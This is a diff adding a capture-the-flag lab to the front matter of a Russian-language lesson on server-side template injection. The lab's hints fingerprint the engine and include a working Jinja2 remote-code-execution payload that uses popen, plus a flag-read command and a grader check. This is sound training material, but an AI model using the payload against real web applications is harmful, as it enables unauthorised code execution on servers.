@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 50
 summary: "Определение шаблонизатора и per-engine sandbox escape до RCE: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, EJS, Pebble, Handlebars."
+lab:
+  kind: shell
+  title: 'Практика: определи движок и получи RCE'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Полиглот `{{7*7}}` → `49`, а `${7*7}` не вычисляется: движок использует `{{ }}`.'
+    - 'Различи движок умножением строки: `{{7*''7''}}` → `7777777` означает Python (Jinja2).'
+    - 'У Jinja2 путь к RCE: `{{lipsum.__globals__[''os''].popen(''id'').read()}}`.'
+    - 'Флаг: выполни `cat /flag` тем же `popen`.'
 ---
 
 ## Вопрос, с которого всё начинается
